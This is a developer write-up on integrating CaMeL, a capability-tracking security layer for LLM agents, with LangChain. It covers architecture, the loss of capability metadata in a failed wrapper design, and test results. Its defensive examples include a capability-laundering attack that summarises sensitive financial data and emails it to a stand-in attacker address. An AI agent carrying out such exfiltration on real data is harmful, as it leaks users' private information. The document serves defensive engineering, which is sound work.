# CaMeL Framework Integration Learnings

## Goal

Integrate CaMeL's capability-based security architecture with LangChain, enabling LangChain-based agents to leverage CaMeL's security guarantees while maintaining full capability tracking and policy enforcement.

## Architecture Comparison: Google ADK vs LangChain

CaMeL was originally built for Google ADK. Integrating with LangChain required adapting to a different agent framework.

| Component | Google ADK (Native) | LangChain (Adapted) |
|-----------|---------------------|---------------------|
| **Architecture** | PLLM + CaMeLInterpreter as ADK agents | Code generator + CaMeL interpreter service |
| **Orchestration** | `LoopAgent` (built-in) | Manual loop implementation |
| **Code Generation** | `LlmAgent` (ADK built-in) | Custom `LangChainCodeGenerator` |
| **State Management** | ADK `session.state` | Instance variables (`tool_calls_chain`, `current_dependencies`) |
| **Execution Flow** | Async (`AsyncGenerator`, `Event` system) | Synchronous |
| **Session Handling** | `InvocationContext` | Stateless per run |
| **Integration Type** | Native (CaMeL designed for it) | Adapter (wraps CaMeL components) |
| **Complexity** | Low (uses framework abstractions) | Medium (~200 lines of glue code) |

Google ADK provides high-level abstractions (`LoopAgent`, session management) that must be manually implemented for LangChain. However, the core security logic remains identical.

## Successful Approach: Code Generation

### Architecture

```
User Request
     ↓
LangChain LLM → Generates Python Code (markdown-wrapped)
     ↓
CaMeL Interpreter → Executes with capability tracking
     ↓
Secure Result (capabilities preserved)
```

### Why This Works

1. **Execution Environment Isolation**: Values never leave CaMeL's execution environment, so capabilities are never lost
2. **Tool Abstraction**: LangChain treats tools as Python functions in code, not as callable objects
3. **Natural Integration**: Code generation aligns with how CaMeL was designed to work

### Implementation Components

**1. `LangChainCodeGenerator`** (`langchain_camel_integration.py`)
- Generates Python code using LangChain LLMs (OpenAI, OpenRouter, etc.)
- Ensures code is wrapped in markdown format: ` ```python\n...\n``` ` (CaMeL requirement)
- Implements error feedback: previous execution errors are fed back to LLM for correction
- Configurable via system prompt with tool descriptions

**2. `CaMeLLangChainAgent`** (`langchain_camel_integration.py`)
- Uses `CaMelInterpreterService` directly (same as ADK integration)
- Manual loop replacing ADK's `LoopAgent`:
  ```python
  for iteration in range(max_iterations):
      code = code_generator.generate_code(user_input, previous_error)
      output, tool_calls, error, _, dependencies = interpreter_service.execute_code(
          code, tool_calls_chain, current_dependencies
      )
      if error:
          previous_error = str(error)  # Feed back to LLM
      else:
          return success
  ```
- Tracks state across iterations:
  - `tool_calls_chain`: History of tool invocations for logging
  - `current_dependencies`: CaMeL's capability propagation state

**3. State Management**
- CaMeL manages capability state internally via `CaMelInterpreterService`
- Agent tracks `tool_calls_chain` and `current_dependencies` as instance variables
- These are passed to `execute_code()` on each iteration and updated after execution
- LangChain's conversation history is maintained separately (orthogonal concerns)

## Challenges and Solutions

### Challenge 1: Markdown Format Requirement ⚠️ Critical

**Problem**: CaMeL's interpreter strictly requires code wrapped in markdown:
```python
# Required format
```python
code_here
```
```

**Initial Bug**: LLM generated plain code → CaMeL rejected with `InvalidOutputError`

**Solution**:
1. System prompt explicitly instructs: `"You MUST wrap your code in ```python ... ```"`
2. `_extract_code_from_response()` ensures wrapping is preserved (not stripped):
   ```python
   # Find and return complete markdown block
   start = response.find("```python")
   end = response.find("```", start + 9)
   return response[start:end+3]  # Preserves wrapper
   ```

### Challenge 2: Error Feedback Loop ✓ Solved

**Problem**: When generated code fails, LLM needs error feedback to correct it

**ADK Solution**: `LoopAgent` handles this automatically via event system

**LangChain Solution**: Manual implementation
```python
if error:
    previous_error = str(error)
    code = generator.generate_code(user_input, previous_error)
```

**Result**: Works correctly. Real LLMs adapt to errors (e.g., fixing argument names, retry logic).

### Challenge 3: Capability Propagation ⚠️ Critical Security Issue

**Problem**: Tools that transform data must propagate capabilities from inputs to outputs. Without this, capability laundering attacks are possible.

**Example Vulnerability**:
```python
# VULNERABLE - no dependencies specified
create_tool(summarize_content, readers=frozenset({"admin", "trusted"}))

# Attack: Read sensitive → Summarize → capabilities LOST → Send to attacker succeeds
```

**Fix**: Specify dependencies to propagate capabilities
```python
create_tool(
    summarize_content,
    readers=frozenset({"admin", "trusted"}),
    dependencies=("text",)  # Output inherits input capabilities
)

# Now: Read sensitive → Summarize → capabilities PRESERVED → Send blocked
```

**Test**: Test 3 (Capability Inheritance) verifies this protection:
- Read `sensitive/financial_data.txt`
- Summarize content
- Attempt to email to `evil@attacker.com`
- **Result**: Blocked after 10 iterations (LLM tried multiple approaches)

**Key Learning**: Every tool that transforms or processes data MUST declare dependencies on input parameters, or it creates a capability laundering vulnerability.

### Non-Issues

**Streaming/Async**: Not a problem. Used synchronous `.invoke()` which returns complete responses.

**LangChain Tool Ecosystem**: Not needed. Code generation approach doesn't use LangChain's tool calling mechanism.

**Memory/State Conflicts**: No conflicts. LangChain's conversation history and CaMeL's execution state are orthogonal.

## Failed Approach: Tool Wrapper

### What Was Attempted

`CaMeLToolWrapper` class that wrapped CaMeL tools to look like LangChain tools:

```python
class CaMeLToolWrapper(BaseTool):
    def _run(self, **kwargs):
        # Wrap arguments as CaMeLValues
        wrapped = self._wrap_args(kwargs)
        
        # Check policy
        result = self.security_policy.check_tool_execution(...)
        
        # Execute tool
        output = func(**wrapped)
        
        # ⚠️ PROBLEM: Return value with PUBLIC capabilities
        return CaMeLValue(raw=output, capabilities=Capabilities.camel())
```

### Why It Failed

**Root Cause**: LangChain transforms tool outputs through its own processing pipeline (memory storage, type conversions, string formatting), which strips CaMeL metadata.

**Capability Loss Flow**:
```
CaMeL tool returns sensitive data (with sensitive capabilities)
     ↓
LangChain stores in memory / passes to next tool
     ↓
Python object transformations (str(), dict(), etc.)
     ↓
Capabilities metadata LOST
     ↓
Data becomes effectively public
```

**Security Impact**: 
- Test case: `send_notification("evil@attacker.com", sensitive_message)`
- Expected: Blocked due to sensitive capabilities
- Actual: Allowed (capabilities were lost → treated as public)

**Fundamental Issue**: LangChain is not capability-aware. It treats tool outputs as plain Python values. CaMeL's security model requires that capabilities travel with values throughout execution - this is impossible when values pass through LangChain's processing.

### Code Evidence

From `camel_to_langchain.py`:
```python
wrapped[key] = type('CaMeLValue', (), {
    'raw': value,
    'capabilities': Capabilities.camel(),  # ← Always public!
    ...
})()
```

This assigns public capabilities to all wrapped values, effectively bypassing CaMeL's security model.

## Key Learnings

### 1. Architecture Matters for Security

**Insight**: The code generation approach preserves security because values never leave CaMeL's execution environment. Tool wrapper approach failed because values must pass through LangChain, losing metadata.

**Lesson**: When integrating security systems with external frameworks, maintain isolation of the security-critical execution environment.

### 2. Capability Propagation is Non-Obvious

**Problem**: Easy to forget that transformation tools need `dependencies` parameter.

**Impact**: Missing dependencies creates capability laundering vulnerabilities where sensitive data can be "cleaned" through transformations.

**Solution**: Code review checklist item: "Does this tool transform data? If yes, does it declare dependencies?"

### 3. Framework Abstractions Hide Complexity

**Google ADK**: Uses `LoopAgent`, `session.state`, async events → appears simple but relies heavily on framework
**LangChain**: Manual loop, instance variables, sync execution → more code but more explicit

**Lesson**: "Simple" integration (ADK) and "complex" integration (LangChain) have similar core logic (~200 lines). Difference is whether framework provides abstractions or you implement them.

### 4. LLM Code Generation is Surprisingly Robust

**Concern**: Would LLMs generate correct code?

**Reality**: With proper system prompts, LLMs reliably:
- Use correct function signatures
- Pass keyword arguments
- Store results in variables
- Print outputs
- Recover from errors via feedback loop

**Test Evidence**: 100% success rate across all test scenarios with `meta-llama/llama-3.3-70b-instruct:free`.

### 5. Testing Reveals Design Flaws

**Discovery**: Test 3 (capability inheritance) initially failed, revealing missing dependencies on `summarize_content`.

**Value**: Comprehensive security tests caught a vulnerability that code review might miss. Tests should cover:
1. Basic capability tracking
2. Policy enforcement (block + allow cases)
3. Capability inheritance through transformations ← Critical
4. Multi-step operations
5. Error handling

## Integration Comparison Summary

**Google ADK Integration** (Native):
- Lines of custom code: ~0 (uses framework)
- Complexity: Low (framework handles everything)
- Integration type: Native
- Best for: Google Cloud deployments, ADK ecosystem

**LangChain Integration** (Adapted):
- Lines of custom code: ~200 (generator + agent)
- Complexity: Medium (manual orchestration)
- Integration type: Adapter pattern
- Best for: LangChain ecosystem, diverse LLM providers

**Both preserve CaMeL's security guarantees identically.**

## Testing Results

All 7 integration tests pass:
1. ✓ Capability tracking through execution
2. ✓ Security policy enforcement (block unauthorized)
3. ✓ Security policy enforcement (allow authorized)
4. ✓ Security policy enforcement (allow public)
5. ✓ Capability inheritance (prevent laundering)
6. ✓ Error feedback loop
7. ✓ Multi-step operations

**Success Rate**: 100.0% with real LLM (OpenRouter + Llama 3.3 70B)

## Files

- `experiments/framework_bridges/langchain/langchain_camel_integration.py`: Working integration
- `experiments/framework_bridges/langchain/test_langchain_camel_integration.py`: Comprehensive tests
- `experiments/framework_bridges/langchain/camel_to_langchain.py`: Failed tool wrapper approach (kept for reference)
- `camel/camel_agent/camel_agent.py`: Original ADK integration (unchanged)
